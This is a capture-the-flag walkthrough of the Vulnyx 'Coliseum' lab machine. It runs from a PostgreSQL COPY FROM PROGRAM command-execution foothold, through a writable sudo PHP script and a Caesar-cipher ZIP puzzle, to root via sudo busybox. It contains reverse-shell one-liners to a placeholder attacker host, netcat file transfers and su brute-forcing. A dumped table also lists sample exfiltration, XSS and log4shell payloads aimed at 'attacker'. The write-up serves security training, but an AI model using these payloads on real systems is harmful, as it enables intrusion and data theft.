# Vulnyx: Coliseum

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Medium |
| **Creator** | `Lenam` |
| **Tools used** | `nmap` · `Burp Suite` · `psql` · `nc` · `suForce` |
| **Tags** | `#PostgreSQL` `#RCE` `#SudoAbuse` `#WritableScript` `#PasswordCracking` `#GTFOBins` |
| **URL** | https://vulnyx.com/machines/ |

A PostgreSQL account (recovered through an undocumented Burp Suite step) has enough privilege to run `COPY ... FROM PROGRAM`, turning database access directly into command execution. A `sudo`-permitted PHP script gets a foothold as a second user, `cesar`, whose home directory holds the start of an elaborate nested-ZIP puzzle: each archive's password is a Caesar-shifted version of a key found in the previous one. Solving the whole chain builds a custom wordlist, cracked against `su cesar` with `suForce`, and a final `sudo` rule around `busybox` reaches root.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn coliseum.nyx

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
5432/tcp open  postgresql syn-ack ttl 64
MAC Address: 08:00:27:2B:25:45 (Oracle VirtualBox virtual NIC)
```

Three ports come back open: **22 (SSH)**, **80 (HTTP)**, and **5432 (PostgreSQL)** — a database exposed to the network is the immediate standout. A version/script scan against all three fills in the details:

```bash
$ sudo nmap -p 22,80,5432 -sCV coliseum.nyx

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 10.0p2 Debian 7 (protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.65 ((Debian))
|_http-server-header: Apache/2.4.65 (Debian)
|_http-title: Arena Entrance
5432/tcp open  postgresql PostgreSQL DB 17.0 - 17.8
| tls-alpn:
|_  postgresql
| ssl-cert: Subject: commonName=coliseum
| Subject Alternative Name: DNS:coliseum
| Not valid before: 2025-12-05T23:22:04
|_Not valid after:  2035-12-03T23:22:04
|_ssl-date: TLS randomness does not represent time
MAC Address: 08:00:27:2B:25:45 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

```
http://coliseum.nyx
```

<img src="../Images/coliseum/Pasted image 20260717001254.png"/>

```
http://coliseum.nyx/register.php
```

<img src="../Images/coliseum/Pasted image 20260716225656.png"/>

```
http://coliseum.nyx/profile.php?gladiator_id=CDLXIV
```

<img src="../Images/coliseum/Pasted image 20260716225948.png"/>

The `gladiator_id` parameter takes Roman numerals rather than plain integers — worth keeping in mind if this ID feeds into anything else (a query, a lookup) later on.

### Finding Database Credentials

> ⚠️ **Undocumented step.** The original notes recover the PostgreSQL credentials here through Burp Suite, but capture only two screenshots — no request, response, or description of what was tampered with. The credentials below are what that step produced; the exact manipulation isn't reconstructable from the notes as they stand.

<img src="../Images/coliseum/Pasted image 20260716230157.png"/>
<img src="../Images/coliseum/Pasted image 20260716230917.png"/>

> **PostgreSQL credentials:** `colosseum_user` / `0Qn5311Ov4NQApPX9G4Z`
> **Database:** `colosseum_app`

## Initial Access

### PostgreSQL Access

The recovered credentials log straight into the database:

```bash
$ psql -h coliseum.nyx -p 5432 -U colosseum_user -W colosseum_app
Password:
psql (18.4 (Debian 18.4-1+b1), server 17.6 (Debian 17.6-0+deb13u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: postgresql)
Type "help" for help.

colosseum_app=#
```

Listing tables and dumping `users` reveals a set of gladiator accounts — each `armory_note` is a themed pentesting one-liner, and one of them (Vero's) even embeds the database connection string:

```sql
colosseum_app=# \d
                List of relations
 Schema |     Name      |   Type   |     Owner
--------+---------------+----------+----------------
 public | users         | table    | colosseum_user
 public | users_id_seq  | sequence | colosseum_user
(2 rows)
colosseum_app=# SELECT * FROM users;
 id  |    username     |            email             | gladiator_id |                                                    armory_note                                                     |                        password_hash                        |          created_at
-----+------------------+-------------------------------+--------------+----------------------------------------------------------------------------------------------------------------+---------------------------------------------------------------+-------------------------------
 408 | Prisco           | prisco@colosseum.nyx         | CDVIII       | nmap -sC -sV -O 10.10.0.0/24; mark ssh banner for creds reuse                                                    | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 409 | Vero             | vero@colosseum.nyx           | CDIX         | pgsql:host=db;port=5432;dbname=colosseum_app;sslmode=disable;password=0Qn53110v4NQApPX9G4Z;user=colosseum_user  | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 417 | Carpóforo        | carpoforo@colosseum.nyx      | CDXVII       | sqlmap -u "http://target/login.php" --risk=3 --batch                                                            | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 418 | Commodo          | commodo@colosseum.nyx        | CDXVIII      | ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt                              | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 419 | Myrinus          | myrinus@colosseum.nyx        | CDXIX        | jwt brute: kid header LFI -> /var/www/html/jwt.key                                                              | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 430 | Triumphus        | triumphus@colosseum.nyx      | CDXXX        | bloodhound: Sharphound zip upload to neo4j, abuse DCSync                                                        | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 431 | Dédalo           | dedalo@colosseum.nyx         | CDXXXI       | pivot with chisel socks5 1080 -> proxychains nmap                                                               | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 432 | Hermes           | hermes@colosseum.nyx         | CDXXXII      | XSS payload: <script src=//attacker/pwn.js></script>                                                            | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 433 | Amazon           | amazon@colosseum.nyx         | CDXXXIII     | wfuzz -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://target -H "Host: FUZZ.target"| $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 434 | Achillia         | achillia@colosseum.nyx       | CDXXXIV      | kerberoast with Rubeus asktgt / stealth TGS roasting                                                            | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 450 | Flamma           | flamma@colosseum.nyx         | CDL          | responder on LLMNR/NetBIOS; crack hashes with hashcat -m 5600                                                   | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 451 | Spiculus         | spiculus@colosseum.nyx       | CDLI         | CVE-2021-4034 pkexec exploit to root; drop bash suid                                                            | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 452 | Marcus Attilius  | marcus_attilius@colosseum.nyx| CDLII        | sudo -l -> exec escape: "R^X then /bin/sh                                                                       | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 453 | Crixus           | crixus@colosseum.nyx         | CDLIII       | zip slip payload ../war/html/shell.php in tar.gz                                                                | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 454 | Spartacus        | spartacus@colosseum.nyx      | CDLIV        | msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.0.99 LPORT=9001                                             | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 455 | Sabatius         | sabatius@colosseum.nyx       | CDLV         | CORS misconfig: Access-Control-Allow-Origin: * with credentials                                                 | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 456 | Melitio          | melitio@colosseum.nyx        | CDLVI        | SSTI in Jinja: {{\`__class__\`.__mro__[2].__subclasses__()}}                                                    | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 457 | Mazicinus        | mazicinus@colosseum.nyx      | CDLVII       | gobuster dir -x php,txt,bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                     | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 458 | Alumnus          | alumnus@colosseum.nyx        | CDLVIII      | evil via curl -T loot.tar.gz ftp://attacker:21                                                                  | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 459 | Ideus            | ideus@colosseum.nyx          | CDLIX        | log4shell: ${jndi:ldap://attacker:a} in User-Agent                                                              | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 460 | Callimorfus      | callimorfus@colosseum.nyx    | CDLX         | binary exploitation: check NX/PIE/RELRO with checksec; overwrite GOT                                            | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 461 | Serpenius        | serpenius@colosseum.nyx      | CDLXI        | JWT none alg fallback; forge admin token with kid pointing /etc/passwd                                          | $2y$10$UPCgAT/VinfpLT5dX/hekeMBVfmACcGwEj65JP8D2OjbsreH1jwUC | 2025-12-06 00:45:24.07725+01 |
 464 | Hipatia          | hipatia@coliseo.com          | CDLXIV       |                                                                                                                  | $2y$12$IlDtWjkTgjQBtWH0VCQcuWnKTItd9XfzpVyh/eCZqnBMVy3HZ5N2  | 2026-07-16 22:58:53.3777+02  |
(23 rows)
```

### RCE via `COPY ... FROM PROGRAM`

`COPY ... FROM PROGRAM` runs an arbitrary shell command and imports its output as table data — a documented PostgreSQL feature that becomes full command execution the moment the connecting role has the privilege to use it (superuser, or the `pg_execute_server_program` role). It's tested first with a harmless command:

```sql
colosseum_app=# DROP TABLE IF EXISTS cmd_exec;
NOTICE:  la tabla «cmd_exec» no existe, omitiendo
DROP TABLE
colosseum_app=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
colosseum_app=# COPY cmd_exec FROM PROGRAM 'id';
COPY 1
colosseum_app=# SELECT * FROM cmd_exec;
                      cmd_output
--------------------------------------------------------
 uid=101(postgres) gid=104(postgres) grupos=104(postgres),103(ssl-cert)
(1 row)
```

With execution confirmed, the same technique fires a reverse shell:

```sql
colosseum_app=# DROP TABLE IF EXISTS cmd_exec;
DROP TABLE
colosseum_app=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
colosseum_app=# COPY cmd_exec FROM PROGRAM 'bash -c "/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"';
```

### Shell as postgres

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [coliseum.nyx] 33770
bash: no se puede establecer el grupo de proceso de terminal (1007): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
postgres@coliseum:/var/lib/postgresql/17/main$ id
uid=101(postgres) gid=104(postgres) grupos=104(postgres),103(ssl-cert)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

```bash
postgres@coliseum:/$ id
uid=101(postgres) gid=104(postgres) grupos=104(postgres),103(ssl-cert)
postgres@coliseum:/$ ls -l /home
total 4
drwx------    2 cesar    cesar         4096 Dec 10  2025 cesar
postgres@coliseum:/$ ls -l /home/cesar/
ls: no se puede abrir el directorio '/home/cesar/': Permiso denegado
```

## Lateral Movement

### Escalating to cesar via a Sudo PHP Script

```bash
postgres@coliseum:/$ sudo -l
Matching Defaults entries for postgres on coliseum:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User postgres may run the following commands on coliseum:
    (cesar) NOPASSWD: /usr/bin/php /var/www/html/tools/backup.php
postgres@coliseum:/$ cat /var/www/html/tools/backup.php
<?php
/**
Please remember to implement the PHP-based backup system.
The script should be located at /var/www/html/tools/backup.php and be executable via /usr/bin/php.
Make sure it supports all required backup options and handles errors and logging properly.
**/
```

The current user can run this script as `cesar` via `sudo`, and it's writable but effectively empty — its contents get replaced with a PHP reverse shell:

```bash
$ nano /var/www/html/tools/backup.php
```

<img src="../Images/coliseum/Pasted image 20260716232842.png"/>

Running it as `cesar` through the `sudo` rule calls back to the attacker:

```bash
# Victim Machine
$ sudo -u cesar /usr/bin/php /var/www/html/tools/backup.php

# Attacker Machine
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [coliseum.nyx] 58034
cesar@coliseum:/$ id
uid=1000(cesar) gid=1000(cesar) grupos=1000(cesar),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
```

```bash
cesar@coliseum:/$ ls -l /home/cesar
total 128
-rw-r--r--    1 cesar    cesar       121350 Dec  8  2025 cesar_I.zip
-rw-r--r--    1 cesar    cesar          353 Dec 10  2025 initial_hint.txt
-rw-------    1 cesar    cesar           33 Dec  2025 user.txt
cesar@coliseum:/$ cat /home/cesar/user.txt
677a094d0f3a3f0d64efe9c8594e8733
```

> **User flag:** `677a094d0f3a3f0d64efe9c8594e8733`

### A Caesar Cipher Puzzle Chain

```bash
cesar@coliseum:/$ cat /home/cesar/initial_hint.txt
At the entrance of the Coliseum, the very first gate is sealed.
Its key was altered on Caesar's command, shifting each symbol along
a secret line of characters.

The elders only left this inscription for you:

KEY_FOR_CAESAR: uqclxh7glp

They also whispered that this secret line was forged
from all the lowercase letters... followed by the ten digits.
```

`cesar`'s home directory holds the start of a custom puzzle: a hint file and a password-protected ZIP. Both are pulled to the attacker machine:

```bash
# Victim Machine
$ nc <ATTACKER_IP> <PORT> < initial_hint.txt
$ nc <ATTACKER_IP> <PORT> < cesar_I.zip

# Attacker Machine
$ nc -lvp <PORT> > initial_hint.txt
$ nc -lvp <PORT> > cesar_I.zip
```

The puzzle's structure: each hint file contains a line `KEY_FOR_CAESAR: <value>`, where that value is the *actual* ZIP password run through a Caesar shift over a custom alphabet (lowercase letters + digits). A purpose-built script automates the whole chain — for each level, it brute-forces all 36 possible shifts against the hint's key until one of them unlocks the ZIP (tested via `unzip -t`), extracts it, looks for the next hint (`pista.txt`) and the next nested ZIP inside, and repeats until no further nesting is found. Every password recovered along the way gets saved into a wordlist:

```python
#!/usr/bin/env python3

import sys
import re
import string
import subprocess
import os
import shutil

ALPHABET = string.ascii_lowercase + string.digits
KEY_PREFIX = "KEY_FOR_CAESAR:"


def caesar(text, shift):
    """Aplica un desplazamiento tipo César sobre ALPHABET (a-z0-9)."""
    res = []
    n = len(ALPHABET)
    for ch in text:
        if ch in ALPHABET:
            idx = ALPHABET.index(ch)
            res.append(ALPHABET[(idx + shift) % n])
        else:
            res.append(ch)
    return "".join(res)


def extract_key_from_file(path):
    """Busca la línea KEY_FOR_CAESAR: ... y devuelve el valor."""
    if not os.path.exists(path):
        return None

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            if KEY_PREFIX in line:
                m = re.search(rf"{KEY_PREFIX}\s*(\S+)", line)
                if m:
                    return m.group(1).strip()
    return None


def test_zip_password(zip_path, password):
    """
    Prueba la contraseña contra el ZIP usando 'unzip -t' (solo test, no extrae).
    Devuelve True si la contraseña es correcta.
    """
    result = subprocess.run(
        ["unzip", "-t", "-P", password, zip_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return result.returncode == 0


def extract_zip(zip_path, password, out_dir):
    """Extrae el ZIP completo a out_dir usando 'unzip -P'."""
    if os.path.exists(out_dir):
        shutil.rmtree(out_dir)
    os.makedirs(out_dir)

    result = subprocess.run(
        ["unzip", "-qq", "-P", password, zip_path, "-d", out_dir],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    if result.returncode != 0:
        raise RuntimeError(f"Error al extraer {zip_path} con la contraseña dada")


def brute_force_zip_password(zip_path, twisted_text):
    """
    Dado un ZIP y el texto 'retorcido' de su contraseña,
    prueba todos los desplazamientos posibles del “César”
    devolviendo (password_en_claro, shift_encontrado).
    """
    for shift in range(len(ALPHABET)):
        candidate = caesar(twisted_text, -shift)  # deshacer la torsión
        if test_zip_password(zip_path, candidate):
            return candidate, shift

    raise RuntimeError(f"No se encontró contraseña válida para {zip_path}")


def find_inner_zip(dir_path):
    """Devuelve la ruta del único ZIP dentro de dir_path, o None si no hay."""
    zips = []
    for entry in os.listdir(dir_path):
        if entry.lower().endswith(".zip"):
            zips.append(os.path.join(dir_path, entry))

    if not zips:
        return None
    # Asumimos uno solo; si hay más, cogemos el primero.
    return zips[0]


def main():
    # Uso:
    #   python3 solve_cesar_chain_unzip.py [zip_inicial] [hint_inicial]
    #
    # Por defecto:
    #   zip_inicial  -> cesar_I.zip
    #   hint_inicial -> initial_hint.txt
    base_dir = os.getcwd()
    initial_zip = sys.argv[1] if len(sys.argv) > 1 else "cesar_I.zip"
    initial_hint = sys.argv[2] if len(sys.argv) > 2 else "initial_hint.txt"

    initial_zip_path = os.path.join(base_dir, initial_zip)
    initial_hint_path = os.path.join(base_dir, initial_hint)

    if not os.path.exists(initial_zip_path):
        print(f"[!] No se encuentra el ZIP inicial: {initial_zip_path}")
        sys.exit(1)
    if not os.path.exists(initial_hint_path):
        print(f"[!] No se encuentra el fichero de pista inicial: {initial_hint_path}")
        sys.exit(1)

    twisted_for_current = extract_key_from_file(initial_hint_path)
    if not twisted_for_current:
        print(f"[!] No se encontró '{KEY_PREFIX}' en {initial_hint_path}")
        sys.exit(1)

    current_zip = initial_zip_path
    level = 1
    used_passwords = []

    work_root = os.path.join(base_dir, "extracted_levels_unzip")
    if os.path.exists(work_root):
        shutil.rmtree(work_root)
    os.makedirs(work_root)

    # Para mostrar al final el contenido del último pista.txt
    last_note_path = None

    print(f"[+] Empezando cadena desde: {initial_zip}")
    print(f"[+] Usando pista inicial  : {initial_hint}\n")

    while True:
        level_dir = os.path.join(work_root, f"level_{level:03d}")
        print(f"[+] Resolviendo nivel {level} → {os.path.basename(current_zip)}")

        # 1) Fuerza bruta de la contraseña de este ZIP
        try:
            password, shift = brute_force_zip_password(current_zip, twisted_for_current)
        except Exception as e:
            print(f"[!] Error haciendo fuerza bruta en {current_zip}: {e}")
            break

        used_passwords.append(password)
        print(f"    - Contraseña encontrada: '{password}' (shift {shift})")

        # 2) Extraer el ZIP con la contraseña correcta
        try:
            extract_zip(current_zip, password, level_dir)
        except Exception as e:
            print(f"[!] Error extrayendo {current_zip}: {e}")
            break

        # 3) Leer la siguiente pista (si existe)
        pista_path = os.path.join(level_dir, "pista.txt")
        last_note_path = pista_path  # lo vamos actualizando en cada nivel

        twisted_next = extract_key_from_file(pista_path)

        # 4) Buscar el ZIP interno (siguiente nivel)
        inner_zip_path = find_inner_zip(level_dir)

        if not twisted_next or not inner_zip_path:
            print("\n[+] No se ha encontrado más KEY_FOR_CAESAR o ningún ZIP interno.")
            print("    Probablemente este sea el último nivel.\n")
            break

        # Preparar siguiente vuelta
        twisted_for_current = twisted_next
        current_zip = inner_zip_path
        level += 1

    # 5) Guardar wordlist con todas las contraseñas usadas
    wordlist_path = os.path.join(base_dir, "wordlist_from_chain.txt")
    with open(wordlist_path, "w", encoding="utf-8") as f:
        for pw in used_passwords:
            f.write(pw + "\n")

    print("=== Cadena completada (o último nivel alcanzado) ===")
    print(f"Niveles resueltos : {len(used_passwords)}")
    print(f"Wordlist guardada : {wordlist_path}")


    # 6) Mostrar contenido del último pista.txt
    if last_note_path and os.path.exists(last_note_path):
        print("\n=== Contenido del último pista.txt ===\n")
        try:
            with open(last_note_path, "r", encoding="utf-8", errors="ignore") as f:
                print(f.read())
        except Exception as e:
            print(f"[!] No se pudo leer el último pista.txt: {e}")
    else:
        print("\n[!] No se encontró el último pista.txt para mostrar su contenido.")


if __name__ == "__main__":
    main()
```

```bash
══ Cadena completada (o último nivel alcanzado) ══
Niveles resueltos : 200
Wordlist guardada : /home/kali/Vulnyx/Medium/Coliseum/wordlist_from_chain.txt

══ Contenido del último pista.txt ══

You have reached the final chamber of the Coliseum (Level CC).

Every key you used to open these sealed scrolls was valid for its own gate.
But here, on this system, there is a gladiator account named 'cesar'.

Exactly ONE of the keys you have used along the way is also the password
for that 'cesar' account.

Gather all of your keys into a single wordlist and try them against
the 'cesar' user.
```

The resulting wordlist is transferred back to the target:

```bash
# Attacker Machine
$ nc <IP_Victim> <PORT> < wordlist_from_chain.txt

# Victim Machine
$ nc -lvp <PORT> > wordlist_from_chain.txt
```

### Cracking cesar's Password with suForce

The reverse shell as `cesar` is enough to read files, but running `cesar`'s own `sudo` rule needs the account's actual password. `suForce` brute-forces `su cesar` with the wordlist built from the puzzle chain:

```bash
cesar@coliseum:~$ wget https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/suForce
cesar@coliseum:~$ chmod +x suForce
cesar@coliseum:~$ ./suForce -u cesar -w wordlist_from_chain.txt

  _____
 |  ___|__  _ __ ___ ___
 |___ \/ __|| '__/ __/ _ \
  ___) \__ \| | | (_|  __/
 |____/|___/|_|  \___\___|

code: d4t4s3c    version: v1.0.0

◎ Username | cesar
📖 Wordlist | wordlist_from_chain.txt
🔵 Status   | 175/199/87%/65tp70vok6
💥 Password | 65tp70vok6
```

> **Credentials:** `cesar:65tp70vok6`

## Privilege Escalation

### `sudo busybox sh`

```bash
cesar@coliseum:/tmp$ sudo -l
[sudo] contraseña para cesar:
Matching Defaults entries for cesar on coliseum:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User cesar may run the following commands on coliseum:
    (root) /usr/bin/busybox
```

`busybox` bundles a huge range of Unix utilities into a single binary, its own shell included — running it as root via `sudo` is equivalent to unrestricted root access, since `busybox sh` is a fully capable shell on its own:

```bash
cesar@coliseum:/tmp$ sudo busybox sh

BusyBox v1.37.0 (Debian 1:1.37.0-6+b3) built-in shell (ash)
Enter 'help' for a list of built-in commands.
```

```bash
/tmp # id
uid=0(root) gid=0(root) grupos=0(root)
/tmp # ls -l /root/
total 4
-rw-------    1 root     root            33 Dec  8  2025 root.txt
/tmp # cat /root/root.txt
c74221673c659c1e98e1b652261492ec
```

> **Root flag:** `c74221673c659c1e98e1b652261492ec`

## Takeaways

- `COPY ... FROM PROGRAM` in PostgreSQL is one of the most direct database-to-RCE paths that exists — worth checking for the moment any database role turns out to have more privilege than a typical application account should need.
- A `sudo`-permitted script is only as safe as its own write permissions — a PHP file runnable as another user but editable by the current one is a direct pivot, the same pattern seen with shell scripts elsewhere in this set.
- Custom, box-specific puzzles (like this Caesar-shift ZIP chain) are worth automating rather than solving by hand — a short script that brute-forces each level and chains automatically turns a tedious manual process into a few seconds of runtime.
- `busybox` (and any similarly all-in-one utility binary) granted through `sudo` should be treated as equivalent to full shell access, since its own shell applet is a complete, unrestricted shell.